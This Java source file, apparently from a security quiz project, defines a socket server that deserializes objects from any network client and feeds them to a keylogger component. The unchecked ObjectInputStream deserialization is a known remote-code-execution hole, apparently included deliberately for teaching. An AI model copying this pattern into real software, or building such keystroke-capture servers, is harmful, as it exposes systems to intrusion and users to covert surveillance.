package org.insecurity_quiz.Advanced_Security_Implementations;

import com.github.kwhat.jnativehook.NativeHookException;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.function.Function;

/**
 * A class for a simple socket server that listens for incoming connections and executes a function on the received string.
 */
public class SocketServer {
    private int serverPort;

    private Function<String, Boolean> execute;

    /**
     * Constructor for the SocketServer class.
     *
     * @param serverPort The port on which the server will listen for incoming connections.
     * @param execute The function to execute on the received string.
     */
    public SocketServer(int serverPort, Function<String, Boolean> execute) {
        this.serverPort = serverPort;
        this.execute = execute;
    }

    /**
     * Starts the server.
     *
     * @throws IOException If an I/O error occurs when creating the server socket.
     */
    public void startServer() throws IOException {
        ServerSocket serverSocket = new ServerSocket(serverPort);
        while (true) {
            Socket socket = serverSocket.accept();
            handleSocket(socket);
        }
    }

    /**
     * Handles an incoming socket connection by reading the input object, executing the function on the input, and logging the result.
     *
     * @param socket The incoming socket connection.
     * @throws IOException If an I/O error occurs when reading the input object or closing the socket.
     */
    private void handleSocket(Socket socket) throws IOException {
        ObjectInputStream inputStream = new ObjectInputStream(socket.getInputStream());
        Object input = null;
        try {
            input = inputStream.readObject();
        } catch (ClassNotFoundException e) {
            System.out.println("Received object could not be read as an object: " + e.getMessage());
            e.printStackTrace();
        } finally {
            socket.close();
        }

        if (input != null) {
            String strInput = input.toString();
            boolean success = execute.apply(strInput);
            System.out.println("Received string: " + strInput);
            System.out.println("Execution status: " + success);
        }
    }

    /**
     * Main method that starts the server.
     *
     * @param args Command line arguments. Expects one argument - the port on which the server will listen for incoming connections.
     * @throws IOException If an I/O error occurs when creating the server socket.
     */
    public static void main(String[] args) throws IOException {
        if (args.length != 2) {
            System.err.println("Usage: java SocketServer <server_port> <output_file>");
            System.exit(1);
        }
        int serverPort = Integer.parseInt(args[0]);
        String outputFile = args[1];

        KeyLogger keylogger = new KeyLogger(outputFile);
        SocketServer server = new SocketServer(serverPort, keylogger::logKey);
        server.startServer();
    }
}
